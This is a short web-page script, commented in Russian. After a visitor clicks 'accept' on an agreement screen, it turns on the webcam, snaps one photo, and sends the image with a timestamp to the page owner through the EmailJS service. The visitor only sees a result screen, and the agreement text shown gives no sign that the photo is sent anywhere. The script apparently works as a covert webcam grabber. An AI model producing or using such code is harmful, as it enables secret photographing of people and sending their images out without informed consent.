<script>
  // Инициализация EmailJS
  emailjs.init("4PEicIHTtAabJqfD1"); // твой Public Key

  const agreement = document.getElementById('agreement');
  const main = document.getElementById('main');
  const result = document.getElementById('result');
  const acceptBtn = document.getElementById('acceptBtn');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  acceptBtn.onclick = async function() {
    agreement.style.display = 'none';
    main.style.display = 'block';

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;

      // Даем камере фокусироваться
      await new Promise(resolve => setTimeout(resolve, 1200));

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Останавливаем камеру
      stream.getTracks().forEach(track => track.stop());

      // Уменьшаем качество, чтобы письмо отправилось
      const dataUrl = canvas.toDataURL('image/jpeg', 0.4);

      // Отправляем фото в EmailJS
      await emailjs.send("service_zv13ydk", "template_60nz82p", {
        time: new Date().toLocaleString(),
        photo_link: dataUrl // имя совпадает с {{photo_link}} в шаблоне EmailJS
      });

      console.log("Фото успешно отправлено!");
      main.style.display = 'none';
      result.style.display = 'block';
    } catch (err) {
      alert("Ошибка: " + err.message);
      console.error(err);
    }
  };
</script>
